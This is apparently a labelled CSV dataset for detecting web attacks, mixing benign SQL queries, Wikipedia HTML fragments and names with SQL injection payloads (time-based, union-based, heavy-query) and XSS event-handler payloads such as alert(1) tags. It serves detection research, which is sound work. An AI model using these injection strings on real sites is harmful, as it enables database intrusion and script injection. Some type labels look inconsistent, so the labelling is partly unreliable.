Text,Label,type
"  (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and ""wsmz"" like ""wsmz",1,sql
"	 <div class=""thumbinner"" style=""width:222px;""><a href=""/wiki/File:D%C3%A9tection_de_personne_-_exemple_3.jpg"" class=""image""><img alt="""" src=""//upload.wikimedia.org/wikipedia/commons/thumb/f/f5/D%C3%A9tection_de_personne_-_exemple_3.jpg/220px-D%C3%A9tection_de_personne_-_exemple_3.jpg"" decoding=""async"" width=""220"" height=""147"" class=""thumbimage"" srcset=""//upload.wikimedia.org/wikipedia/commons/thumb/f/f5/D%C3%A9tection_de_personne_-_exemple_3.jpg/330px-D%C3%A9tection_de_personne_-_exemple_3.jpg 1.5x, //upload.wikimedia.org/wikipedia/commons/thumb/f/f5/D%C3%A9tection_de_personne_-_exemple_3.jpg/440px-D%C3%A9tection_de_personne_-_exemple_3.jpg 2x"" data-file-width=""800"" data-file-height=""533"" /> </a>  <div class=""thumbcaption"">",0,xss
SELECT * FROM chemical WHERE might BETWEEN nor09/01/1996log AND zoo15/31/1996potatoes,0,sql
 </li>,0,xss
"<noembed draggable=""true"" ondragleave=""alert(1)"">test</noembed>",2,xss
"   SELECT Employees.buried, COUNT ( Orders.sleptID )  AS eagerFROM    ( OrdersINNER JOIN wild ON Orders.angryID  =  Employees.southernID ) ",0,sql
SELECT COUNT ( moonID ) FROM shoulder,0,sql
"INSERT INTO began  ( main, break, continued )  VALUES  ( 'accident', 'nation', 'fireplace' )  ",0,sql
1   )    )    as gygm where 4024  =  4024,1,sql
"<details draggable=""true"" ondragstart=""alert(1)"">test</details>",2,xss
<figure id=x tabindex=1 onfocus=alert(1)></figure>,2,xss
"<li><a href=""/wiki/Glossary_of_astronomy"" title=""Glossary of astronomy"">Astronomy </a> </li>",0,xss
select * from users where id  =  1 +   (  \.  )   or 1  =  1 -- 1,1,sql
jordi,0,sql
SELECT * FROM grain FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM forest,0,sql
SELECT * FROM milk WHERE shelter = 'happy' FETCH FIRST 3 ROWS ONLY,0,sql
"1   )    )    as queb where 2449  =  2449 union all select null,null#",1,sql
biurrun-olcoz,0,sql
SELECT * FROM sport WHERE cover = 'fair'  OR field = 'cow',0,xss
"	 <div style=""padding:0em 0.25em"">",0,xss
a' or 1  =  1; --,1,sql
<param onpointerleave=alert(1)>XSS</param>,2,xss
grigoriu matons,0,xss
"1"" waitfor delay '0:0:5' and ""dvfr"" like ""dvfr",1,sql
"<blockquote oncontextmenu=""alert(1)"">test</blockquote>",2,xss
"1%'  )   or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1,sql
"<area oncopy=""alert(1)"" contenteditable>test</area>",2,xss
borque clua,0,sql
"-9315'   )    )     )   union all select 5057,5057,5057,5057,5057#",1,sql
SELECT DISTINCT region FROM necessary,0,sql
<html onfocusout=alert(1) tabindex=1 id=x></html><input autofocus>,2,xss
"1 or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   -- xgyc",1,sql
<embed id=x tabindex=1 ondeactivate=alert(1)></embed><input id=y autofocus>,2,xss
"1 where 2988  =  2988 or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1,sql
SELECT saved,0,sql
18517,0,sql
"<li id=""cite_note-87""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-87"">^ </a> </b> ",0,xss
<base id=x tabindex=1 onfocusin=alert(1)></base>,2,xss
"1'  )   where 1470  =  1470 and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",1,sql
SELECT COUNT ( certain ) FROM factory,0,sql
1%'   )    )     )   rlike sleep  (  5  )   and    (    (     (  '%'  =  ',1,sql
"<audio onmousemove=""alert(1)"">test</audio>",2,xss
</div></div>     ,0,xss
san bartolom de las abiertas,0,sql
"<dl onmousedown=""alert(1)"">test</dl>",2,xss
"<ol onmouseout=""alert(1)"">test</ol>",2,xss
SELECT * FROM program WHERE tower NOT LIKE '[second]%',0,sql
"1%' and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and '%'  =  '",1,sql
SELECT making ( s )  FROM supply LEFT JOIN,0,sql
"<meta onclick=""alert(1)"">test</meta>",2,xss
<var id=x tabindex=1 onactivate=alert(1)></var>,2,xss
	 </span></a></dt><dd>Learn more by playing with a pre-made Scrapy project.</dd>,0,xss
"<div draggable=""true"" contenteditable>drag me</div><canvas ondrop=alert(1) contenteditable>drop here</canvas>",2,xss
"<style>@keyframes slidein {}</style><shadow style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></shadow>",2,xss
"1%' union all select null,null,null,null,null--",1,sql
ansorger,0,xss
1'  )   as xiqw where 8507  =  8507 rlike sleep  (  5  )  --,1,sql
"  SELECT street AS corner, business AS [beauty]  FROM climb",0,sql
"	 </span> <span class=""reference-text""><cite class=""citation book""><a href=""/wiki/Stuart_J._Russell"" title=""Stuart J. Russell"">Stuart J. Russell </a>; <a href=""/wiki/Peter_Norvig"" title=""Peter Norvig"">Peter Norvig </a> (2010). ""26.1.2: Philosophical Foundations/Weak AI: Can Machines Act Intelligently?/The mathematical objection"". <a href=""/wiki/Artificial_Intelligence:_A_Modern_Approach"" title=""Artificial Intelligence: A Modern Approach""><i>Artificial Intelligence: A Modern Approach </i> </a> (3rd ed.). Upper Saddle River, NJ: <a href=""/wiki/Prentice_Hall"" title=""Prentice Hall"">Prentice Hall </a>. <a href=""/wiki/International_Standard_Book_Number"" title=""International Standard Book Number"">ISBN </a>&#160;<a href=""/wiki/Special:BookSources/978-0-13-604259-4"" title=""Special:BookSources/978-0-13-604259-4""><bdi>978-0-13-604259-4 </bdi> </a>. <q>even if we grant that computers have limitations on what they can prove, there is no evidence that humans are immune from those limitations. </q> </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Abook&amp;rft.genre=bookitem&amp;rft.atitle=26.1.2%3A+Philosophical+Foundations%2FWeak+AI%3A+Can+Machines+Act+Intelligently%3F%2FThe+mathematical+objection&amp;rft.btitle=Artificial+Intelligence%3A+A+Modern+Approach&amp;rft.place=Upper+Saddle+River%2C+NJ&amp;rft.edition=3rd&amp;rft.pub=Prentice+Hall&amp;rft.date=2010&amp;rft.isbn=978-0-13-604259-4&amp;rft.au=Stuart+J.+Russell&amp;rft.au=Peter+Norvig&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",0,xss
<ins id=x tabindex=1 onactivate=alert(1)></ins>,2,xss
demarco_phuong@beesmer.me,0,sql
" SELECT column_name ( s )  FROM serve,fill",0,sql
"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and    (    (     (  'clhg'  =  'clhg",1,sql
7.28065E+15,0,sql
"Representing knowledge about knowledge: Belief calculus, <a href=""/wiki/Modal_logic"" title=""Modal logic"">modal logics </a>:",0,xss
chekhov@biosaludsystems.gov,0,sql
"1""   )    )    as xhat where 6674  =  6674 union all select null,null,null#",1,sql
"<isindex ondblclick=""alert(1)"">test</isindex>",2,xss
FROM  ( SELECT DISTINCT wood FROM roof ) ,0,xss
SELECT wheel FROM taken UNION SELECT grandmother FROM until ORDER BY colony,0,sql
"<center draggable=""true"" ondragleave=""alert(1)"">test</center>",2,xss
busoms redolad,0,sql
SELECT * FROM leave ORDER BY musical,0,sql
"  SELECT definition,off,opportunity FROM beneath LEFT JOIN Orders ON cold.appleID =  surface.attempt ORDER BY evening.trap",0,sql
SELECT * FROM crew FETCH FIRST 50 PERCENT ROWS ONLY,0,sql
"<li><a href=""#CITEREFHolland1975"">Holland 1975 </a>, </li>",0,xss
SELECT * FROM arm WHERE cold = 'balance',0,sql
SELECT torn ( s )  FROM pile UNION,0,sql
"<li><a href=""/wiki/Institute_for_Ethics_and_Emerging_Technologies"" title=""Institute for Ethics and Emerging Technologies"">Institute for Ethics and Emerging Technologies </a> </li>",0,xss
<input2 onpointerdown=alert(1)>XSS</input2>,2,xss
document.write,2,xss
<caption onpointerover=alert(1)>XSS</caption>,2,xss
"<dt draggable=""true"" ondragend=""alert(1)"">test</dt>",2,xss
"            <a href=""//readthedocs.org/projects/scrapy/?fromdocs=scrapy"">Project Home</a>",0,xss
SELECT AVG ( somehow ) FROM make SELECT SUM ( shade ) ,0,sql
	 </span></a></dt><dd>Understand what Scrapy is and how it can help you.</dd>,0,xss
SELECT * FROM improve FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM gift,0,sql
"  UPDATE brought SET again =  'center', City =  'father' WHERE tongue =  grown",0,sql
SELECT pig FROM near UNION SELECT position FROM earth ORDER BY happen,0,sql
"guzman de alfarache, 18,",0,xss
"1%""   )    )     (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )   and    (    (   ""%""  =  """,1,xss
" select * from users where id  =  1 or 1#""{ union select 'a',version  (    )   -- 1",1,sql
SELECT differ ( s FROM unit RIGHT JOIN,0,sql
"<ul><li><a href=""/wiki/Abductive_reasoning"" title=""Abductive reasoning"">Abductive reasoning </a> </li>",0,xss
"1 and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  ",1,xss
"1'  )   as ildf where 5545  =  5545 union all select null,null,null,null#",1,sql
SELECT * FROM vapor WHERE flat = 'review'  AND City = 'branch',0,xss
renoir@cocheacoche.fk,0,sql
SELECT * FROM current ORDER BY blind DESC,0,sql
FROM  ( SELECT DISTINCT most FROM earth ) ,0,sql
bernab,0,sql
" SELECT * FROM took ORDER BY shelf, share",0,sql
"	 </span><a href=""/w/index.php?title=Artificial_intelligence&amp;action=edit&amp;section=54"" title=""Edit section: Decrease in demand for human labor"">edit </a><span class=""mw-editsection-bracket"">] ",0,xss
"<br onkeyup=""alert(1)"" contenteditable>test</br>",2,xss
<ins id=x tabindex=1 onfocusin=alert(1)></ins>,2,xss
<summary onpointerenter=alert(1)>XSS</summary>,2,xss
"<div draggable=""true"" contenteditable>drag me</div><section ondrop=alert(1) contenteditable>drop here</section>",2,xss
SELECT * FROM whole ORDER BY night DESC,0,sql
1'+  (  select 'wsjk' where 3291  =  3291,1,sql
"<acronym onkeyup=""alert(1)"" contenteditable>test</acronym>",2,xss
ofere*nte,0,sql
"1'  )   where 6941  =  6941 and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )  --",1,sql
"1'   )    )    and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (   'swjk'  =  'swjk",1,sql
86168713h,0,sql
"1  )   as idvt where 3490  =  3490 and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1,sql
"	<ul id=""footer-icons"" class=""noprint"">",0,xss
SELECT * FROM ride FETCH FIRST 50 PERCENT ROWS ONLY,0,sql
"1%""   )    )     )   and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and    (    (     (  ""%""  =  """,1,xss
1'+  (  select 'vtyw' where 7950  =  7950 order by 1--,1,sql
"-9941 union all select 1321,1321,1321,1321,1321,1321,1321#",1,sql
SELECT create ( s )  FROM original SELECT worried FROM eventually,0,sql
"1' where 2774  =  2774 union all select null,null,null,null,null#",1,sql
leandro,0,sql
valverde de la virgen,0,xss
<noframes id=x tabindex=1 onbeforeactivate=alert(1)></noframes>,2,xss
<image onpointerup=alert(1)>XSS</image>,2,xss
"<bgsound oncopy=""alert(1)"" contenteditable>test</bgsound>",2,xss
"1""  )   as nqtn where 5606  =  5606 and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1,sql
"1' where 8969  =  8969 union all select null,null,null,null,null--",1,sql
SELECT * FROM soil WHERE among LIKE '%join%',0,xss
SELECT * FROM spent WHERE nobody  BETWEEN 10 AND 20,0,xss
"1%'  )   and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and   (  '%'  =  '",1,xss
"  SELECT pleasant,excited,spend FROM arm LEFT JOIN Orders ON get.winID =  rice.there ORDER BY community.work",0,sql
"  SELECT Orders.proverID, Employees.although, Employees.thin FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.equipmentID ORDER BY Orders.keyID",0,sql
livino,0,sql
butalov0@lettere.dm,0,sql
46630334l,0,sql
"<ul><li><a href=""/wiki/Cryptography"" title=""Cryptography"">Cryptography </a> </li>",0,xss
p44m8scu6916n,0,sql
laruffa,0,sql
1  )   where 9552  =  9552 and 1961  =  6333--,1,sql
SELECT * FROM caught WHERE balloon BETWEEN '1996-07-01' AND '1996-07-31',0,sql
benasque,0,sql
segu san marful,0,sql
"<b onkeyup=""alert(1)"" contenteditable>test</b>",2,xss
"  SELECT original,policeman FROM guide WHERE away = 'bright' UNION SELECT keep, coffee FROM grow",0,xss
"	 </span> <span class=""reference-text"">",0,xss
SELECT COUNT ( usually )  FROM slabs,0,xss
SELECT tight FROM tears,0,sql
 </div>,0,xss
select * from users where id  =  '1' or \<$ or 1  =  1 -- 1',1,sql
"<em onbeforecopy=""alert(1)"" contenteditable>test</em>",2,xss
 </li>,0,xss
	 </span> </a> </li>,0,xss
34105397p,0,sql
e0u08os1,0,sql
<hr id=x tabindex=1 onfocus=alert(1)></hr>,2,xss
"<keygen onmouseup=""alert(1)"">test</keygen>",2,xss
<body onpointermove=alert(1)>XSS</body>,2,xss
	 </span> 2018 ,0,xss
 UPDATE grew SET tax = 'bus'WHERE throughout = 'pictured',0,sql
<q id=x tabindex=1 onactivate=alert(1)></q>,2,xss
" </div> </td> </tr><tr><th scope=""row"" class=""navbox-group"" style=""width:1%""><a href=""/wiki/Human%E2%80%93computer_interaction"" title=""Human–computer interaction"">Human–computer<br />interaction </a> </th><td class=""navbox-list navbox-even"" style=""text-align:left;border-left-width:2px;border-left-style:solid;width:100%;padding:0px"">",0,xss
psklib,0,xss
FROM  ( SELECT DISTINCT choice FROM event ) ,0,sql
"  SELECT Orders.strugglerID, Employees.brief, Employees.favorite FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.leafID ORDER BY Orders.grabbedID",0,sql
"1   )    )     )   and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (     (  2997  =  2997",1,sql
1' where 2958  =  2958,1,sql
"<li><a href=""/wiki/Falsifiability"" title=""Falsifiability"">Falsifiability </a> </li>",0,xss
castellanos de zapardiel,0,xss
"	 </span><span class=""mw-editsection""><span class=""mw-editsection-bracket"">[ ",0,xss
SELECT TOP 50 PERCENT * FROM differ,0,sql
-5585%'   )    )     )   or 6990  =  7727,1,sql
 </li>,0,xss
SELECT * FROM art WHERE physical = 'dropped' LIMIT 3,0,sql
"	 <div id=""mw-normal-catlinks"" class=""mw-normal-catlinks""><a href=""/wiki/Help:Category"" title=""Help:Category"">Categories </a>: <ul><li><a href=""/wiki/Category:Artificial_intelligence"" title=""Category:Artificial intelligence"">Artificial intelligence </a> </li><li><a href=""/wiki/Category:Cybernetics"" title=""Category:Cybernetics"">Cybernetics </a> </li><li><a href=""/wiki/Category:Formal_sciences"" title=""Category:Formal sciences"">Formal sciences </a> </li><li><a href=""/wiki/Category:Technology_in_society"" title=""Category:Technology in society"">Technology in society </a> </li><li><a href=""/wiki/Category:Computational_neuroscience"" title=""Category:Computational neuroscience"">Computational neuroscience </a> </li><li><a href=""/wiki/Category:Emerging_technologies"" title=""Category:Emerging technologies"">Emerging technologies </a> </li><li><a href=""/wiki/Category:Unsolved_problems_in_computer_science"" title=""Category:Unsolved problems in computer science"">Unsolved problems in computer science </a> </li><li><a href=""/wiki/Category:Computational_fields_of_study"" title=""Category:Computational fields of study"">Computational fields of study </a> </li> </ul> </div>",0,xss
1%'   )    ) ,1,sql
	 </span> </li>,0,xss
document.write,2,xss
"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and   (  'ahjo'  =  'ahjo",1,sql
"   SELECT 'Customer' AS Type, ContactName, City, CountryFROM Customers  UNIONSELECT 'Supplier', ContactName, City, Country",0,sql
413f1go,0,sql
 </li>,0,xss
"1%"" rlike sleep  (  5  )  #",1,sql
<tbody id=x tabindex=1 onfocus=alert(1)></tbody>,2,xss
"  SELECT MICROSECOND ( ""23:59:59.000045"" ) ;",0,xss
SELECT * FROM naturally WHERE refused = 'chain'  AND City = 'way',0,sql
DELETE FROM recall WHERE lake = 'society',0,xss
34964894h,0,sql
" </div> </td> </tr><tr><th scope=""row"" class=""navbox-group"" style=""width:1%""><a href=""/wiki/Metaheuristic"" title=""Metaheuristic"">Metaheuristic methods </a> </th><td class=""navbox-list navbox-even hlist"" style=""text-align:left;border-left-width:2px;border-left-style:solid;width:100%;padding:0px"">",0,xss
SELECT beauty ( s )  FROM locate SELECT modern ( s ) ,0,sql
"1'  )   or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and   (  'wdru' like 'wdru",1,sql
burns-gerron@100mbps.ht,0,xss
germe,0,sql
SELECT * FROM accept WHERE tie NOT LIKE '[deep]%',0,xss
"<li><cite id=""CITEREFHernandez-Orallo2000"" class=""citation journal"">Hernandez-Orallo, Jose (2000). ""Beyond the Turing Test"". <i>Journal of Logic, Language and Information </i>. <b>9 </b> (4): 447–466. <a href=""/wiki/Digital_object_identifier"" title=""Digital object identifier"">doi </a>:<a rel=""nofollow"" class=""external text"" href=""https://doi.org/10.1023%2FA%3A1008367325700"">10.1023/A:1008367325700 </a>. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=article&amp;rft.jtitle=Journal+of+Logic%2C+Language+and+Information&amp;rft.atitle=Beyond+the+Turing+Test&amp;rft.volume=9&amp;rft.issue=4&amp;rft.pages=447-466&amp;rft.date=2000&amp;rft_id=info%3Adoi%2F10.1023%2FA%3A1008367325700&amp;rft.aulast=Hernandez-Orallo&amp;rft.aufirst=Jose&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",0,xss
SELECT TOP 50 PERCENT * FROM fence SELECT * FROM explain FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM down,0,sql
